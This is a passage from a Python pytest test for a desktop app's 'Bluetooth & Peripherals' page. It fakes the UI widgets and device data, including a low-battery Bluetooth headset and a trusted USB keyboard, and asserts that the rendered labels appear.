    assert '("hermes", "Stephen AI",' in app_src
    assert '("peripherals", "Bluetooth & Peripherals",' in app_src
    hp_src = (Path(__file__).resolve().parents[1] / "astracradle" / "ui" / "pages" / "hermes_page.py").read_text(encoding="utf-8")
    assert "Stephen AI Agent" in hp_src

    # 2. Dedicated Bluetooth & Peripherals page renders Bluetooth batteries (<20% highlighted) + USB/HID + Audio/Displays
    rendered_texts: list[str] = []

    class _FakePWidget:
        def __init__(self, *a, **kw):
            if "text" in kw:
                rendered_texts.append(str(kw["text"]))

        def pack(self, *a, **kw):
            return self

        def winfo_children(self):
            return []

        def winfo_exists(self):
            return True

        def destroy(self):
            return None

    monkeypatch.setattr(
        pp_mod,
        "ctk",
        types.SimpleNamespace(CTkFrame=_FakePWidget, CTkLabel=_FakePWidget, CTkButton=_FakePWidget, CTkSwitch=_FakePWidget),
    )
    monkeypatch.setattr(
        pp_mod,
        "tk",
        types.SimpleNamespace(BooleanVar=lambda value=False: types.SimpleNamespace(get=lambda: value, set=lambda _v: None)),
    )
    monkeypatch.setattr(pp_mod, "_collect_audio_and_display_summary", lambda: (["PipeWire Sink 1"], ["HDMI-A-1 connected"], ["usb1"]))

    fake_app = types.SimpleNamespace(
        peripherals_scroll=_FakePWidget(),
        palette=get_palette("obsidian"),
        fonts=get_ui_fonts(1.0),
        config_obj=AppConfig(),
        cfg_mgr=types.SimpleNamespace(save=lambda _c: None),
        usb_guard=types.SimpleNamespace(
            scan_all_peripherals=lambda: [
                PeripheralDevice(
                    device_key="usb-1",
                    bus="usb",
                    name="Keychron K2",
                    vendor="Keychron",
                    status="trusted",
                    plain_description="USB Mechanical Keyboard",
                )
            ]
        ),
        _latest_bt_devices=[
            BluetoothDeviceInfo(mac="AA:BB:CC:11:22:33", name="Sony WH-1000XM5", device_kind="audio", connected=True, battery_pct=14),
            BluetoothDeviceInfo(mac="DD:EE:FF:44:55:66", name="Xbox Controller", device_kind="input", connected=True, battery_pct=82),
        ],
        _latest_peripherals=None,
        _content_wrap=lambda pad=0: 700,
        _on_toggle_usb_strict_gate=lambda _v: None,
        _on_trust_usb=lambda _d: None,
        switch_nav=lambda _k: None,
        show_toast=lambda *_a, **_kw: None,
    )
    pp_mod.render_peripherals_page(fake_app)  # type: ignore[arg-type]
    joined = "\n".join(rendered_texts)
    assert "Bluetooth & Peripherals — All Connected Devices" in joined
    assert "Sony WH-1000XM5" in joined and "14% LOW!" in joined
    assert "Xbox Controller" in joined and "82%" in joined
    assert "Keychron K2" in joined
    assert "PipeWire Sink 1" in joined and "HDMI-A-1 connected" in joined











































